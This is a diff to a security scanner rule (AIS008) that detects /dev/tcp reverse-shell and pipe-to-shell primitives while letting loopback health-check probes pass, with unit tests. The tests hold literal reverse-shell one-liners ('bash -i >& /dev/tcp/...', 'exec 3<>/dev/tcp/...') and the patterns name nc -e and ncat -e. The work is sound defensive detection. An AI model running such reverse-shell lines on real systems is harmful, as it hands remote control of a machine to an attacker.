@@ -370,13 +370,77 @@ ais008_first_untrusted_pipe(text, pattern, path) -> int = {
     hit
 }
 
+ais008_devtcp_dangerous(line) = {
+    str_contains(line, "bash -i") ||
+        str_contains(line, "0>&") ||
+        str_contains(line, "0<&") ||
+        re_is_match("<>\\s*/dev/tcp/", line) ||
+        re_is_match(">&\\s*/dev/tcp/", line)
+}
+
+ais008_devtcp_allowed_host(line) = {
+    re_is_match("/dev/tcp/127\\.0\\.0\\.1/", line) ||
+        re_is_match("/dev/tcp/localhost/", line) ||
+        re_is_match("/dev/tcp/::1/", line)
+}
+
+ais008_devtcp_forbidden_host(line) = {
+    str_contains(line, "/dev/tcp/") && (
+        re_is_match("/dev/tcp/\\$", line) ||
+            (re_is_match("/dev/tcp/[0-9]", line) && !re_is_match("/dev/tcp/127\\.0\\.0\\.1/", line)) ||
+            (re_is_match("/dev/tcp/[A-Za-z]", line) && !re_is_match("/dev/tcp/localhost/", line)) ||
+            (re_is_match("/dev/tcp/:", line) && !re_is_match("/dev/tcp/::1/", line))
+    )
+}
+
+ais008_devtcp_probe_ok(line) = {
+    if ais008_devtcp_dangerous(line) {
+        false
+    } else if !re_is_match("(?i)echo[^\\n]*>/dev/tcp/", line) {
+        false
+    } else if ais008_devtcp_forbidden_host(line) {
+        false
+    } else if !ais008_devtcp_allowed_host(line) {
+        false
+    } else {
+        true
+    }
+}
+
+ais008_first_bad_devtcp(text) -> int = {
+    lines := split_lines(text)
+    hit mut:= 0
+    i mut:= 0
+    while i < len(lines) && hit == 0 {
+        line := lines[i]
+        if str_contains(line, "/dev/tcp/") {
+            if !ais008_devtcp_probe_ok(line) {
+                hit = i + 1
+            }
+        }
+        i = i + 1
+    }
+    hit
+}
+
 pub ais008(path, text) -> vec<Finding> = {
     out := new()
     if has_skip(text, "AIS008") {
         out
     } else {
+        devtcp_line := ais008_first_bad_devtcp(text)
+        if devtcp_line > 0 {
+            push(out, make_finding(
+                "AIS008",
+                Severity.High,
+                "2.1",
+                "AML.T0010.000",
+                path,
+                devtcp_line,
+                "Reverse-shell or pipe-to-shell primitive matched"
+            ))
+        }
         shell_patterns := new()
-        push(shell_patterns, "/dev/tcp/")
         push(shell_patterns, "nc -e")
         push(shell_patterns, "ncat -e")
         i mut:= 0
@@ -604,6 +668,55 @@ test "scan_agent combines rules" = {
 test "ais008 matches /dev/tcp" = {
     fs := ais008("rev.sh", "bash -i >& /dev/tcp/1.2.3.4/44 0>&1\n")
     assert_eq(len(fs) > 0, true)
+}
+
+test "ais008 loopback echo probe clean" = {
+    fs := ais008("healthcheck.sh", "while ! (echo >/dev/tcp/127.0.0.1/8080) 2>/dev/null; do sleep 1; done\n")
+    assert_eq(len(fs), 0)
+}
+
+test "ais008 loopback echo localhost and v6" = {
+    fs1 := ais008("h.sh", "echo >/dev/tcp/localhost/8080\n")
+    fs2 := ais008("h.sh", "echo >/dev/tcp/::1/8080\n")
+    assert_eq(len(fs1), 0)
+    assert_eq(len(fs2), 0)
+}
+
+test "ais008 localhost interactive shell high" = {
+    fs := ais008("rev.sh", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1\n")
+    assert_eq(len(fs) > 0, true)
+    assert_eq(fs[0].id, "AIS008")
+}
+
+test "ais008 exec bidirectional loopback high" = {
+    fs := ais008("rev.sh", "exec 3<>/dev/tcp/127.0.0.1/4444\n")
+    assert_eq(len(fs) > 0, true)
+    assert_eq(fs[0].id, "AIS008")
+}
+
+test "ais008 echo non loopback host high" = {
+    fs := ais008("probe.sh", "echo >/dev/tcp/203.0.113.5/9\n")
+    assert_eq(len(fs) > 0, true)
+    assert_eq(fs[0].id, "AIS008")
+}
+
+test "ais008 healthcheck fixture clean" = {
+    text := read_text("../../fixtures/AIS008/pass/healthcheck.sh", 100000)
+    fs := ais008("scripts/healthcheck.sh", text)
+    assert_eq(len(fs), 0)
+}
+
+test "ais008 healthcheck doc fixture clean" = {
+    text := read_text("../../fixtures/AIS008/pass/docs/healthcheck.md", 100000)
+    fs := ais008("docs/healthcheck.md", text)
+    assert_eq(len(fs), 0)
+}
+
+test "ais008 devtcp localhost fail fixture" = {
+    text := read_text("../../fixtures/AIS008/fail/devtcp-localhost.sh", 100000)
+    fs := ais008("scripts/devtcp-localhost.sh", text)
+    assert_eq(len(fs) > 0, true)
+    assert_eq(fs[0].id, "AIS008")
 }
 
 test "ais001 skip on hook" = {
